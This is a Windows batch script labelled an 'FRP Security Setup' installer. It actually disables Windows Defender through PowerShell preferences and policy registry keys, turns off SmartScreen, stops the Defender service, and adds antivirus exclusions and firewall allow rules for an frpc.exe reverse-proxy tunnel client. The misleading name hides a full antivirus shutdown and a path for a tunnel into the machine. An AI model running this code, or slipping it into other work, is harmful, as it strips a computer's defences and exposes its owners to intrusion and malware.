@echo off
setlocal EnableDelayedExpansion

:: Must run as Administrator
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo ERROR: Please run this script as Administrator.
    timeout 20
    exit /b 1
)

echo ============================================
echo  FRP Security Setup - Idempotent Installer
echo ============================================
echo.

:: ── Windows Defender ─────────────────────────────────────────
echo [1/5] Configuring Windows Defender...

powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"         2>nul
powershell -Command "Set-MpPreference -DisableBehaviorMonitoring $true"         2>nul
powershell -Command "Set-MpPreference -DisableBlockAtFirstSeen $true"           2>nul
powershell -Command "Set-MpPreference -DisableIOAVProtection $true"             2>nul
powershell -Command "Set-MpPreference -DisablePrivacyMode $true"                2>nul
powershell -Command "Set-MpPreference -DisableScriptScanning $true"             2>nul
powershell -Command "Set-MpPreference -DisableArchiveScanning $true"            2>nul
powershell -Command "Set-MpPreference -MAPSReporting Disabled"                  2>nul
powershell -Command "Set-MpPreference -SubmitSamplesConsent NeverSend"          2>nul

echo [1/5] Done.

:: ── Registry keys (all use /f so they overwrite silently if already exist) ──
echo [2/5] Applying registry settings...

reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiVirus /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f >nul 2>&1

:: SmartScreen
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\System" /v EnableSmartScreen /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter" /v EnabledV9 /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" /v SmartScreenEnabled /t REG_SZ /d "Off" /f >nul 2>&1
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\AppHost" /v EnableWebContentEvaluation /t REG_DWORD /d 0 /f >nul 2>&1

echo [2/5] Done.

:: ── Defender Service ─────────────────────────────────────────
echo [3/5] Disabling Defender service...

sc query WinDefend >nul 2>&1
if %errorLevel% equ 0 (
    sc config WinDefend start= disabled >nul 2>&1
    sc stop WinDefend >nul 2>&1
    echo [3/5] WinDefend service disabled.
) else (
    echo [3/5] WinDefend service not found or already removed. Skipping.
)

:: ── FRP Defender Exclusions ───────────────────────────────────
echo [4/5] Adding FRP exclusions to Defender...

:: Check if path exclusion already exists before adding
powershell -Command "
    \$existing = (Get-MpPreference).ExclusionPath;
    if (\$existing -notcontains 'C:\saudiakar-erp\aso\frp\') {
        Add-MpPreference -ExclusionPath 'C:\saudiakar-erp\aso\frp\';
        Write-Host '[4/5] Path exclusion added.'
    } else {
        Write-Host '[4/5] Path exclusion already exists. Skipping.'
    }
" 2>nul

:: Check if process exclusion already exists before adding
powershell -Command "
    \$existing = (Get-MpPreference).ExclusionProcess;
    if (\$existing -notcontains 'frpc.exe') {
        Add-MpPreference -ExclusionProcess 'frpc.exe';
        Write-Host '[4/5] Process exclusion added.'
    } else {
        Write-Host '[4/5] Process exclusion already exists. Skipping.'
    }
" 2>nul

:: ── Firewall Rules ────────────────────────────────────────────
echo [5/5] Configuring firewall rules...

:: Remove existing rules first (idempotent - delete then re-add)
netsh advfirewall firewall delete rule name="FRP Client Outbound" >nul 2>&1
netsh advfirewall firewall delete rule name="FRP Client Inbound"  >nul 2>&1

:: Add fresh rules
netsh advfirewall firewall add rule ^
    name="FRP Client Outbound" ^
    dir=out ^
    action=allow ^
    program="C:\saudiakar-erp\aso\frp\frpc.exe" ^
    enable=yes ^
    description="FRP tunnel client outbound" >nul 2>&1

netsh advfirewall firewall add rule ^
    name="FRP Client Inbound" ^
    dir=in ^
    action=allow ^
    program="C:\saudiakar-erp\aso\frp\frpc.exe" ^
    enable=yes ^
    description="FRP tunnel client inbound" >nul 2>&1

echo [5/5] Firewall rules configured.

:: ── Summary ───────────────────────────────────────────────────
echo.
echo ============================================
echo  All steps completed successfully.
echo  Please RESTART the computer to apply all
echo  changes fully.
echo ============================================
echo.

